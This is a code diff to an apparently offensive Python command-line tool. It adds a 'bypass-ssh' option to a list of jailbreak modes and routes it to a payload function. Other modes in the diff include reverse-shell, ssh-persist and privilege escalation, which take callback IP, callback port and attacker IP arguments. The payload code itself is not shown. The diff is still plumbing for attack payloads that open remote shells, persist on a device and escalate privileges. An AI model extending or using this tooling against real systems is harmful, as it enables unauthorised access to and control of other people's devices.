@@ -66,7 +66,8 @@ def _main_fetch_key():
 
 _JAILBREAK_MODES = [
     "ssh", "reverse-shell", "custom", "ssh-persist",
-    "bypass-hosts", "bypass-file", "bypass-cron", "bypass-escalate",
+    "bypass-ssh", "bypass-hosts", "bypass-file", "bypass-cron",
+    "bypass-escalate",
 ]
 
 
@@ -175,7 +176,7 @@ def _run_jailbreak(args):
 
     from .webrtc_payloads import (
         payload_ssh, payload_reverse_shell, payload_custom,
-        payload_ssh_persist,
+        payload_ssh_persist, payload_bypass_ssh,
         payload_bypass_hosts, payload_bypass_file,
         payload_bypass_cron, payload_bypass_escalate,
     )
@@ -217,6 +218,8 @@ def _run_jailbreak(args):
         payload = payload_ssh_persist(
             password=password, callback_ip=callback_ip,
             callback_port=callback_port, hotkey=hotkey)
+    elif mode == "bypass-ssh":
+        payload = payload_bypass_ssh(password=password, hotkey=hotkey)
     elif mode == "bypass-hosts":
         attacker_ip = args.attacker_ip
         if not attacker_ip:
